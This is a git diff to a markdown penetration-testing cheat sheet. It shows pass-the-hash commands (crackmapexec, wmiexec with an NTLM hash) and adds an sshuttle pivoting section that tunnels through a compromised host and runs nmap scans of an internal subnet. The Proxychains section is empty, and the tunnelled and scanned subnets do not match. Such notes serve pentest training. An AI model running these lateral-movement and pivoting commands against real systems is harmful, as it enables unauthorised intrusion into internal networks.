@@ -13,6 +13,9 @@
 ##### ➤ Windows - Pass the hash
 * [1. PTh - Passing the hash methods](#pth---pass-the-hash-methods)
 
+##### ➤ Pivoting
+* [1. Proxychains method](#proxychains)
+* [2. Sshuttle method](#sshuttle)
 ``` ```
 ``` ```
 ## Psexec
@@ -158,4 +161,31 @@ crackmapexec smb 10.0.0.1 -u Admin -H 32196B56FFE6F45E294117B91A83BF38 -x ipconf
 ##### ➤  wmiexec.exe
 ```
 wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Admin@10.0.0.1
+```
+
+
+
+## Proxychains
+
+
+
+## Sshuttle
+
+##### ➤  Installation
+
+https://github.com/sshuttle/sshuttle?tab=readme-ov-file
+
+```
+apt-get install sshuttle
+```
+
+##### ➤  Usage
+```
+# Generate the pivot
+# sshuttle -vr <compromised-user@<compromised-ip-machine-used-to-pivoting> <internal-subnet-targetted>
+sshuttle -vr root@10.0.0.1 172.1.0.0/16
+
+#Execute command from kali another kali shell
+nmap -sn 172.16.0.0/16 -Pn
+nmap -sT -Pn -p80,443 172.16.1.16 -Pn
 ```
